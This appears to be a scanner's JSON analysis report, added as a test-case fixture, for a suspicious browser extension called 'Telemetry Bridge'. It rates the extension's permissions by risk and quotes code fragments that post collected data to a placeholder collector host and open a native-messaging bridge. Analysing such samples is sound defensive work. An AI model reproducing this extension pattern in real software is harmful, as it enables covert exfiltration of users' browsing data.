@@ -1,0 +1,151 @@
+{
+  "container": "zip",
+  "sha256": "7d1536ae2944c74547ffa6444a67496a8fa1555aa3d854f75ffac82940261ebb",
+  "size": 1458,
+  "file_count": 3,
+  "top_level": [
+    "background.js",
+    "content.js",
+    "manifest.json"
+  ],
+  "interesting_files": [
+    "manifest.json"
+  ],
+  "entrypoints": {
+    "manifest": "manifest.json",
+    "package": null,
+    "plugin_xml": null
+  },
+  "manifest": {
+    "manifest_version": 3,
+    "name": "Telemetry Bridge",
+    "version": "0.4.2",
+    "permissions": [
+      "nativeMessaging",
+      "tabs",
+      "storage",
+      "scripting",
+      "webRequest"
+    ],
+    "optional_permissions": [],
+    "host_permissions": [
+      "<all_urls>"
+    ],
+    "background": {
+      "service_worker": "background.js",
+      "scripts": [],
+      "type": "module",
+      "persistent": null
+    },
+    "content_scripts": [
+      {
+        "matches": [
+          "<all_urls>"
+        ],
+        "js": [
+          "content.js"
+        ],
+        "css": [],
+        "run_at": "document_start",
+        "world": "ISOLATED",
+        "all_frames": true
+      }
+    ],
+    "web_accessible_resources": [],
+    "externally_connectable": {
+      "matches": [
+        "*://*/*"
+      ]
+    },
+    "commands": null,
+    "options_page": null,
+    "devtools_page": null,
+    "action": null,
+    "csp": null,
+    "key": null,
+    "update_url": "https://updates.suspicious-cdn.invalid/ext/update.xml"
+  },
+  "package": {},
+  "plugin_xml": {},
+  "suspicious_apis": {
+    "nativeMessaging": {
+      "count": 2,
+      "files": [
+        "manifest.json",
+        "background.js"
+      ],
+      "examples": [
+        "messaging surface.\",   \"permissions\": [\"nativeMessaging\", \"tabs\", \"storage\", \"scripting\", \"webRequest\"],   \"host_permissions\": [\"<all_u",
+        "if (!port) {     port = chrome.runtime.connectNative(NATIVE_HOST);     port.onMessage.addListener((m) => console.debug(\"native\", m))"
+      ]
+    },
+    "webRequest": {
+      "count": 1,
+      "files": [
+        "manifest.json"
+      ],
+      "examples": [
+        "ging\", \"tabs\", \"storage\", \"scripting\", \"webRequest\"],   \"host_permissions\": [\"<all_urls>\"],   \"background\": {\"service_worker\": \"ba"
+      ]
+    },
+    "network_request": {
+      "count": 1,
+      "files": [
+        "background.js"
+      ],
+      "examples": [
+        "ensurePort().postMessage({ blob });     fetch(COLLECTOR, { method: \"POST\", body: blob, mode: \"no-cors\" });     sendResponse({"
+      ]
+    }
+  },
+  "remote_urls": [
+    "https://collector.suspicious-cdn.invalid/ingest",
+    "https://updates.suspicious-cdn.invalid/ext/update.xml",
+    "wss://relay.suspicious-cdn.invalid/ws"
+  ],
+  "scanned_text_files": 3,
+  "permission_surface": {
+    "permissions": [
+      {
+        "name": "nativeMessaging",
+        "risk": "critical"
+      },
+      {
+        "name": "tabs",
+        "risk": "medium"
+      },
+      {
+        "name": "storage",
+        "risk": "low"
+      },
+      {
+        "name": "scripting",
+        "risk": "high"
+      },
+      {
+        "name": "webRequest",
+        "risk": "high"
+      }
+    ],
+    "optional_permissions": [],
+    "host_permissions": [
+      {
+        "pattern": "<all_urls>",
+        "risk": "critical"
+      }
+    ],
+    "high": [
+      "nativeMessaging",
+      "scripting",
+      "webRequest"
+    ],
+    "broad_hosts": [
+      "<all_urls>"
+    ]
+  },
+  "unity": {},
+  "ok": true,
+  "path": "Tool/cases/plugin02/input/ext2.zip",
+  "type": "ZIP 浏览器扩展包",
+  "conclusion": "入口已定位；高风险面=nativeMessaging,scripting,webRequest；需人工确认数据流与最小可改单元"
+}
